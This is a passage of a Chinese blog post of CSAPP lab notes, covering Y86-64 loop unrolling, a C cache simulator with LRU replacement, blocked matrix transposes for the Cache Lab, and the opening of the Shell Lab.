   mrmovq 40(%rdi),%r8</span><br><span class="line">    rmmovq %r8,40(%rsi)</span><br><span class="line">    iaddq $48,%rdi</span><br><span class="line">    iaddq $48,%rsi</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle test</span><br><span class="line">    iaddq $1,%rax  </span><br><span class="line"></span><br><span class="line">test:</span><br><span class="line">    iaddq $-6, %rdx         # 先减，判断够不够6个</span><br><span class="line">    jge Loop                # 6路展开</span><br><span class="line">    iaddq $6, %rdx</span><br><span class="line">    jmp test2               #剩下的</span><br><span class="line"></span><br><span class="line">L:</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle L1</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">L1:</span><br><span class="line">    mrmovq 8(%rdi),%r8</span><br><span class="line">    rmmovq %r8,8(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle L2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">L2:</span><br><span class="line">    mrmovq 16(%rdi),%r8</span><br><span class="line">    rmmovq %r8,16(%rsi)</span><br><span class="line">    iaddq $24,%rdi</span><br><span class="line">    iaddq $24,%rsi</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle test2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">test2:</span><br><span class="line">    iaddq $-3, %rdx         # 先减，判断够不够3个</span><br><span class="line">    jge L</span><br><span class="line">    iaddq $2, %rdx          # -1则不剩了，直接Done,0 剩一个, 1剩2个</span><br><span class="line">    je R0</span><br><span class="line">    jl Done</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle R2</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">R2:</span><br><span class="line">    mrmovq 8(%rdi),%r8</span><br><span class="line">    rmmovq %r8,8(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1,%rax</span><br><span class="line">    jmp Done</span><br><span class="line">R0:</span><br><span class="line">    mrmovq (%rdi),%r8</span><br><span class="line">    rmmovq %r8,(%rsi)</span><br><span class="line">    andq %r8,%r8</span><br><span class="line">    jle Done</span><br><span class="line">    iaddq $1,%rax</span><br></pre></td></tr></tbody></table></figure><h3 id="消除气泡"><a href="#消除气泡" class="headerlink" title="消除气泡"></a>消除气泡</h3><p>注意到程序中的这个操作,会触发加载/使用数据冒险,导致插入一个气泡指令.<br>所以我们可以一次性复制两个数据,避免加载/使用数据冒险</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mrmovq (%rdi), %r8</span><br><span class="line">mrmovq 8(%rdi), %r9</span><br><span class="line">rmmovq %r8, (%rsi)</span><br><span class="line">rmmovq %r9, 8(%rsi)</span><br></pre></td></tr></tbody></table></figure><p>消除后得分45.4</p><h1 id="Lab5-Cache-Lab"><a href="#Lab5-Cache-Lab" class="headerlink" title="Lab5:Cache Lab"></a>Lab5:Cache Lab</h1><h2 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h2><p>模拟Cache的实现.<br>最开始的时候没有看到实验材料里的这句话,考虑复杂了…</p><blockquote><p>For this this lab, you should assume that memory accesses arealigned properly,  such that a singlememory  access  never  crosses  block  boundaries.   By  making  this  assumption,  you  can  ignore  therequest sizes in thevalgrindtraces</p></blockquote><p>大概实现了这样的数据结构,实验采取的是LRU策略,可以用链表来组织实现,我这里就用时间戳代替了.(ps:用time(NULL)获取的时间戳不够准确会造成多个行的时间戳相同,使用clock()代替或使用全局变量记录次数.)</p><blockquote><p>LRU，最近最少使用策略。替换最后一次访问时间最久远的哪一行<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305182207207.png"></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"cachelab.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span>{</span></span><br><span class="line">    <span class="type">int</span> valid;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> time;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tag;</span><br><span class="line">}CacheLine;</span><br><span class="line"></span><br><span class="line">CacheLine** Cache = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> groupcount = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> blocksize = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> s,E,b,t;</span><br><span class="line"><span class="type">char</span> verbose = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> misses = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> hits = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> evictions = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为不需要实际访问数据内容,所以不需要分配2^b字节的数据空间.</span></span><br><span class="line"><span class="comment">//只要地址位于某Set中且标志位相同,则hit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Cache_Init</span><span class="params">(<span class="type">int</span> s,<span class="type">int</span> E,<span class="type">int</span> b)</span></span><br><span class="line">{</span><br><span class="line">    groupcount = <span class="built_in">pow</span>(<span class="number">2</span>,s);</span><br><span class="line">    blocksize = <span class="built_in">pow</span>(<span class="number">2</span>,b);</span><br><span class="line">    Cache = (CacheLine**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine*)*groupcount);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;groupcount;++i)</span><br><span class="line">    {</span><br><span class="line">        Cache[i] = (CacheLine*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine)*E);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j&lt;E;++j)</span><br><span class="line">        {</span><br><span class="line">            Cache[i][j].valid = <span class="number">0</span>;</span><br><span class="line">            Cache[i][j].time = <span class="number">0</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hit</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" hit"</span>);</span><br><span class="line">    ++hits;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">miss</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" miss"</span>);</span><br><span class="line">    ++misses;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">eviction</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" eviction"</span>);</span><br><span class="line">    ++evictions;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">AccessMemory</span><span class="params">(<span class="type">long</span> <span class="type">long</span> addr,<span class="type">int</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//这个地方使用掩码提取而不是直接移位,是因为算术右移会使标记发生变化.</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> mask;</span><br><span class="line">    <span class="comment">//注意制作掩码的时候的常数类型LL</span></span><br><span class="line">    mask = (<span class="number">1LL</span> &lt;&lt; (s + b)) - <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> Setindex = (mask &amp; addr) &gt;&gt; b;</span><br><span class="line">    <span class="comment">// mask = (1LL &lt;&lt; b) - 1;</span></span><br><span class="line">    <span class="comment">// int blockoffset = mask &amp; addr;</span></span><br><span class="line">    mask = (<span class="number">1LL</span> &lt;&lt; t) - <span class="number">1</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> tag = (addr &gt;&gt; (s + b)) &amp; mask;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    CacheLine* CacheSet = Cache[Setindex];</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> LRtime = CacheSet[<span class="number">0</span>].time;</span><br><span class="line">    <span class="type">int</span> LRid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;E;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(CacheSet[i].valid==<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            miss();</span><br><span class="line">            CacheSet[i].tag = tag;</span><br><span class="line">            CacheSet[i].valid = <span class="number">1</span>;</span><br><span class="line">            CacheSet[i].time = clock();</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(CacheSet[i].tag==tag)</span><br><span class="line">        {</span><br><span class="line">            hit();</span><br><span class="line">            CacheSet[i].time = clock();</span><br><span class="line">            flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(CacheSet[i].time&lt;LRtime)</span><br><span class="line">        {</span><br><span class="line">            LRtime = CacheSet[i].time;</span><br><span class="line">            LRid = i;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        miss();</span><br><span class="line">        CacheSet[LRid].tag = tag;</span><br><span class="line">        CacheSet[LRid].time = clock();</span><br><span class="line">        eviction();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* trace = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> optc;</span><br><span class="line">    <span class="keyword">while</span>((optc = getopt(argc,(<span class="type">char</span>* <span class="type">const</span> *)argv,<span class="string">"vs:E:b:t:"</span>))!=<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">switch</span>(optc)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                s = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                E = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">                b = atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">                trace = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(optarg)+<span class="number">1</span>);</span><br><span class="line">                <span class="built_in">strcpy</span>(trace,optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">                verbose = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;                </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    t = <span class="number">64</span>-s-b;</span><br><span class="line"></span><br><span class="line">    Cache_Init(s,E,b);</span><br><span class="line"></span><br><span class="line">    FILE* tracefile = fopen(trace,<span class="string">"r"</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> opt;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> addr;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">50</span>);</span><br><span class="line">        fgets(buf,<span class="number">50</span>,tracefile);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">sscanf</span>(buf,<span class="string">" %c %llx,%d"</span>,&amp;opt,&amp;addr,&amp;size)!=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">switch</span>(opt)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>:</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'L'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">                <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%c %llx,%d"</span>,opt,addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" \n"</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'M'</span>:</span><br><span class="line">                <span class="keyword">if</span>(verbose==<span class="number">1</span>)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"%c %llx,%d"</span>,opt,addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">" \n"</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                {</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                    AccessMemory(addr,size);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    printSummary(hits,misses,evictions);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(trace);</span><br><span class="line">    trace = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;groupcount;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">free</span>(Cache[i]);</span><br><span class="line">        Cache[i] = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">free</span>(Cache);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>完成的截图<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305182159330.png"></p><h2 id="Part-B-1"><a href="#Part-B-1" class="headerlink" title="Part B"></a>Part B</h2><p><a href="https://zhuanlan.zhihu.com/p/387662272">https://zhuanlan.zhihu.com/p/387662272</a></p><h3 id="32x32"><a href="#32x32" class="headerlink" title="32x32"></a>32x32</h3><h4 id="暴力转置"><a href="#暴力转置" class="headerlink" title="暴力转置"></a>暴力转置</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j, tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) {</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) {</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241452391.png"></p><h4 id="分块转置"><a href="#分块转置" class="headerlink" title="分块转置"></a>分块转置</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> i1,j1;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span>(j1 = j;j1&lt;j+<span class="number">8</span>;++j1)</span><br><span class="line">                <span class="keyword">for</span>(i1 = i;i1&lt;i+<span class="number">8</span>;++i1)</span><br><span class="line">                    B[j1][i1] = A[i1][j1];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241452306.png"></p><h4 id="分块-变量存储"><a href="#分块-变量存储" class="headerlink" title="分块+变量存储"></a>分块+变量存储</h4><p>A和B矩阵相同下标的元素映射到缓存的同一组(回忆一下缓存的分组机制)<br>所以对于对角线上的元素,AB的连续访问发生冲突.<br>这里可以用空间换时间,一次将进入缓存的一整行读出来保存到临时变量中.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> j1;</span><br><span class="line">    <span class="type">int</span> val1,val2,val3,val4,val5,val6,val7,val0;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;M;j+=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;M;i+=<span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span>(j1 = j;j1&lt;j+<span class="number">8</span>;++j1)</span><br><span class="line">            {</span><br><span class="line">                val0 = A[j1][i];</span><br><span class="line">                val1 = A[j1][i+<span class="number">1</span>];</span><br><span class="line">                val2 = A[j1][i+<span class="number">2</span>];</span><br><span class="line">                val3 = A[j1][i+<span class="number">3</span>];</span><br><span class="line">                val4 = A[j1][i+<span class="number">4</span>];</span><br><span class="line">                val5 = A[j1][i+<span class="number">5</span>];</span><br><span class="line">                val6 = A[j1][i+<span class="number">6</span>];</span><br><span class="line">                val7 = A[j1][i+<span class="number">7</span>];</span><br><span class="line">                B[i][j1] = val0;</span><br><span class="line">                B[i+<span class="number">1</span>][j1] = val1;</span><br><span class="line">                B[i+<span class="number">2</span>][j1] = val2;</span><br><span class="line">                B[i+<span class="number">3</span>][j1] = val3;</span><br><span class="line">                B[i+<span class="number">4</span>][j1] = val4;</span><br><span class="line">                B[i+<span class="number">5</span>][j1] = val5;</span><br><span class="line">                B[i+<span class="number">6</span>][j1] = val6;</span><br><span class="line">                B[i+<span class="number">7</span>][j1] = val7;</span><br><span class="line">            }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241453434.png"></p><h3 id="64x64"><a href="#64x64" class="headerlink" title="64x64"></a>64x64</h3><p>按照8x8分块,块的内部会发生冲突,于是使用4x4分块.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> transpose_submit_desc[] = <span class="string">"Transpose submission"</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> i1,j1;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;M;j+=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;M;i+=<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">for</span>(j1 = j;j1&lt;j+<span class="number">4</span>;++j1)</span><br><span class="line">                <span class="keyword">for</span>(i1 = i;i1&lt;i+<span class="number">4</span>;++i1)</span><br><span class="line">                    B[j1][i1] = A[i1][j1];</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305241548256.png"></p><h1 id="Lab6-Shell-lab"><a href="#Lab6-Shell-lab" class="headerlink" title="Lab6:Shell lab"></a>Lab6:Shell lab</h1><p>实现一个有工作分配,信号处理,进程回收的shell.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306190955121.png"></p><h2 id="部分实现"><a href="#部分实现" class="headerlink" title="部分实现"></a>部分实现</h2><h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="type">int</span> 